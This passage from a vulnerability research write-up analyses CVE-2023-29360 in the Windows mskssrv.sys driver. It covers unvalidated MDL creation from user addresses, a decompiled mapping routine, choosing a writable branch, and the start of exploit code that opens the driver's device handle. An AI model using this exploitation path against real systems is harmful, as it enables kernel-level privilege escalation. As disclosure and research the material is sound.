min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">AddressPtr</code> which is later passed to <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">MmProbeAndLockPages</code>. This probing is done on <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">KernelMode</code> rather than being done via <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">UserMode</code>. This implies that that we can create a MDL based on arbitrary address and there would be <strong class="font-bold">no validation</strong> done since <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">KernelMode</code> is specified. </p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Looking at the implementation of <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">MmProbeAndLockPages</code>,we can confirm this </p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><picture class="relative"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit mx-auto"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://seg-fault.gitbook.io/researchs/~gitbook/image?url=https%3A%2F%2F1804885456-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIo3S6x9y21ea77Yw303B%252Fuploads%252FAL9tv93pYrfKSEGnDYEa%252Fimage.png%3Falt%3Dmedia%26token%3D8b57c1a7-577d-4337-8d5f-f8084eb2c99c&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=49a31ce9&amp;sv=2" width="760" height="378"></div><figcaption class="text-xs text-center text-tint mt-2">MmProbeAndLockPages</figcaption></picture></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">If <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">AccessMode</code> is 0, then no check is done since the condition is evaluated to be false. AccessMode is 0 for kernel and 1 for Usermode.</p><h3 id="understanding-mdl" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://seg-fault.gitbook.io/researchs/windows-security-research/exploit-development/mskssrv.sys-cve-2023-29360#understanding-mdl"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_8r8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_8r8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">Understanding MDL</div></h3><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">MDL or <strong class="font-bold">Memory Descriptor List</strong> in windows is used by kernel to describe the physical page layout for a Virtual address. MDL is a opaque structure where <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">StartVa</code> member points to the Virtual Address associated with the MDL. More details on MDL can be found <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://big5-sec.github.io/posts/CVE-2023-29360-analysis/">here<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_igt8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_igt8qav5ukqiv5ubsnpfivb_)"></rect></svg></a> and <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-mdls">here<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_j0t8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_j0t8qav5ukqiv5ubsnpfivb_)"></rect></svg></a>.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Looking at <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">IoAllocateMdl</code>, it simply creates a MDL structure on the basis of values passed to it</p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><picture class="relative"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit mx-auto"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://seg-fault.gitbook.io/researchs/~gitbook/image?url=https%3A%2F%2F1804885456-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIo3S6x9y21ea77Yw303B%252Fuploads%252FpXARFH9TdYKOWI7EQZcx%252Fimage.png%3Falt%3Dmedia%26token%3Db6b503ef-a889-4f10-acf3-b9b44695eee2&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=937ec229&amp;sv=2" width="1489" height="653"></div><figcaption class="text-xs text-center text-tint mt-2">IoAllocateMdl</figcaption></picture></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">There is no check for <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">StartVa</code> member and hence arbitrary virtual address can be passed to it. Next, after the obtaining the MDL structure, the function passes it into <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">MmProbeAndLockPages</code> which will lock the MDL's <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">StartVa</code> and make sure its not paged out while driver is still operating on the data. Notice that <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">IoWriteAccess</code> is supplied to it which means that it allows write operation on the mapped MDL's <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">StartVa</code> member.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Now we know can we can create a arbitrary MDL. Lets see what more can be done with the MDL. Looking at xrefs of the MDL, we can see that its only being used inside <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">FSFrameMdl::MapPages</code> function. </p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><picture class="relative"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit mx-auto"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://seg-fault.gitbook.io/researchs/~gitbook/image?url=https%3A%2F%2F1804885456-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIo3S6x9y21ea77Yw303B%252Fuploads%252FwiWrOkKf4WudCtUNyTDw%252Fimage.png%3Falt%3Dmedia%26token%3D0b7b8971-2549-46e9-9291-0a9d9ba4272d&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=9f3b1169&amp;sv=2" width="894" height="635"></div><figcaption class="text-xs text-center text-tint mt-2">this-&gt;Mdl1/2 contains the MDL containing the arbitrary StartVa</figcaption></picture></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Looking at <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">FsMapLockedPages</code>, we can see that it allows us to map the MDL into the process calling the driver. </p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_1b8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">NTSTATUS __fastcall FsMapLockedPages(struct _MDL *Mdl, ULONG Priority, PVOID *a3)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">{<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  NTSTATUS v3; // ebx<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">  v3 = 0;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  if ( !Mdl || !a3 )<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    return STATUS_INVALID_PARAMETER;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  *a3 = 0i64;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  *a3 = MmMapLockedPagesSpecifyCache(Mdl, UserMode, MmCached, 0i64, 0, Priority);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  return v3;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Looking at MmMapLockedPagesSpecifyCache, we see that the last argument to this function is a ULONG that denotes the Priority. If the priority is MdlMappingNoWrite i.e 0x80000000 , the the Virtual Address pointed by the MDL is mapped as Read Only. This means, that we need to select the right code branch that can allow us a control over Priority as well. </p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">There are 2 code branches possible here. </p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><picture class="relative"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit mx-auto"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://seg-fault.gitbook.io/researchs/~gitbook/image?url=https%3A%2F%2F1804885456-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIo3S6x9y21ea77Yw303B%252Fuploads%252F6vKMk5QmV7cTfR1Z3hLF%252Fimage.png%3Falt%3Dmedia%26token%3D5cf1132f-6361-4fd3-a045-4096758c74de&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=6cb6feff&amp;sv=2" width="728" height="583"></div><figcaption class="text-xs text-center text-tint mt-2">Possible Code branches to map MDL's VirtualAddr</figcaption></picture></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">For the second branch, the Priority is hardcoded 0xC0000010 which means a Priority flag of MdlMappingNoWrite | NormalPagePriority | MdlMappingNoExecute . This implies that we need to select the first branch since the second one is mapped as Read Only.</p><h2 id="exploitation" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://seg-fault.gitbook.io/researchs/windows-security-research/exploit-development/mskssrv.sys-cve-2023-29360#exploitation"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_9l8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_9l8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">Exploitation</div></h2><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Now that we have everything figured, out lets break the exploitation steps into multiple steps :-</p><h3 id="step-1-connecting-to-the-vulnerable-driver" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://seg-fault.gitbook.io/researchs/windows-security-research/exploit-development/mskssrv.sys-cve-2023-29360#step-1-connecting-to-the-vulnerable-driver"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_9p8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_9p8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">Step 1 : Connecting to the vulnerable driver</div></h3><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">We know that the vulnerable driver is here <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">mskssrv.sys</code> but, lets figure out how to connect to the driver.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">I was out of idea on this as to how to connect to the driver since it was not working via default connection strings like <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">\\\\.\\Device\\mskssrv</code>. Eventually I created a breakpoint on <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">FSStreamReg::PublishTx</code> and various other functions. Upon starting the camera, we see that the requests are coming from a DLL called <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">frameServer.dll</code> . Lets reverse the DLL to figure out how is it creating the driver handle. </p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><picture class="relative"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit mx-auto"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://seg-fault.gitbook.io/researchs/~gitbook/image?url=https%3A%2F%2F1804885456-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIo3S6x9y21ea77Yw303B%252Fuploads%252FzzigGfYsrzRymmFj2Jl8%252Fimage.png%3Falt%3Dmedia%26token%3D63d3ee28-ea14-4c4e-8a31-cd9b58cff95d&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=97b566f5&amp;sv=2" width="1433" height="442"></div><figcaption class="text-xs text-center text-tint mt-2">frameServer.dll call stack</figcaption></picture></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Reversing the <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">frameServer.dll</code> , we see a function called <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">FSGetMSKSSrvHandle</code> which creates a call to <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">CreateFileW</code> and uses the handle returned by it for further driver communication. Lets create a breakpoint on the same functionality to dump the file parameter passed to CreateFile.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">We switch to WindowsCamera.exe process and wait for the breakpoint to be reached. </p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><picture class="relative"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit mx-auto"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://seg-fault.gitbook.io/researchs/~gitbook/image?url=https%3A%2F%2F1804885456-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIo3S6x9y21ea77Yw303B%252Fuploads%252FOlLlMCtt8Sg8x7e69fRy%252Fimage.png%3Falt%3Dmedia%26token%3D76483324-5b6c-4319-aaa7-8409ab767ffd&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=fdc1a02a&amp;sv=2" width="1030" height="199"></div><figcaption class="text-xs text-center text-tint mt-2">lpFileName</figcaption></picture></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Now, that we have the file name, we can now talk to the driver.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_298qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">bool Driver::SendDataToDriver(int ioctl_code,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                              PVOID buffer,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                              size_t buffer_len,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                              PVOID OutBuffer,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                              size_t out_buffer_len) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">   <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">   LPCWSTR lpFileName =<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        L"\\\\?\\ROOT#SYSTEM#0000#{3c0d501a-140b-11d1-b40f-00a0c9223196}\\{96E080C7-143C-11D1-B40F-"<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        L"00A0C9223196}&amp;{3C0D501A-140B-11D1-B40F-00A0C9223196}";<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">   <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">   HANDLE hDevice = CreateFileW(lpFileName, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                          FILE_ATTRIBUTE_NORMAL, nullptr);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
